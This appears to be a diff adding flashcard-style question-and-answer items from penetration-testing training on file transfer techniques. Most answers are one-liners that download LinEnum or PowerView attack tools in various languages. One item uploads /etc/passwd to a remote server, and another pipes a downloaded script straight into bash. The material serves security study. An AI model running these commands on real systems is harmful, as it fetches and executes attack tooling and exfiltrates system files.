@@ -1,0 +1,21 @@
+What Python 2 command downloads a file from a URL? | python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+What Python 3 command downloads a file from a URL? | python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+What percentage of websites use PHP according to W3Techs? | 77.4%
+What PHP command downloads a file using file_get_contents()? | php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+What PHP function can be used as an alternative to file_get_contents()? | fopen()
+What Ruby command downloads a file? | ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+What Perl command downloads a file? | perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+What Windows applications can execute JavaScript or VBScript code? | cscript and mshta
+What command executes JavaScript code to download a file on Windows? | cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+What command executes VBScript code to download a file on Windows? | cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+What is VBScript? | Microsoft Visual Basic Scripting Edition - an Active Scripting language developed by Microsoft that is modeled on Visual Basic
+Since which Windows version has VBScript been installed by default? | Windows 98
+What Python module is used for HTTP requests including file uploads? | requests
+What command starts a Python upload server? | python3 -m uploadserver
+What Python one-liner uploads a file to an upload server? | python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+What option is used to run Python one-liners from command line? | -c
+What option is used to run PHP one-liners from command line? | -r
+What option is used to run Ruby one-liners from command line? | -e
+What option is used to run Perl one-liners from command line? | -e
+How many programming languages exist according to Wikipedia? | Around 700
+What PHP command pipes downloaded content directly to bash? | php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
